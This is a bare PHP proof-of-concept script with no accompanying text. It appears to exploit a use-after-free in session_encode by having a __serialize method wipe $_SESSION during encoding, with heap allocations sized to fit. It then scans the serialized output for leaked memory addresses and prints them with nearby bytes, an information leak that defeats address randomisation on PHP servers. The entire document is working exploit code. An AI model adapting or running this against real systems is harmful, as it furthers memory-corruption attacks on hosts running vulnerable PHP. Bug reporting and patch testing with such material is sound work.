<?php
error_reporting(0);
ini_set('session.serialize_handler', 'php_serialize');
class C {
    function __serialize() {
        $_SESSION = [];
        $leak = [0x41424344, 0x45464748];
        $GLOBALS['keepref'] =& $leak;
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
$_SESSION['s'] = str_repeat('A', 7);   // zend_string alloc = 24 + 8 = 32
for ($i = 0; $i < 8; $i++) { $_SESSION['k'.$i] = $i; }
$s = session_encode();
echo "len=".(is_string($s)?strlen($s):-1)."\n";
if (is_string($s)) {
  echo "head=".bin2hex(substr($s,0,80))."\n";
  for ($i=0; $i+7 < strlen($s); $i++) {
    $v = unpack('P', substr($s,$i,8))[1];
    if (($v >> 48) === 0) {
      $top = ($v >> 44) & 0xf;
      if (($top === 7 || $top === 5 || $top === 6) && (($v >> 32) & 0xffff) !== 0) {
        echo "PTR at $i: ".dechex($v)." ctx=".bin2hex(substr($s,max(0,$i-24),64))."\n";
      }
    }
  }
}
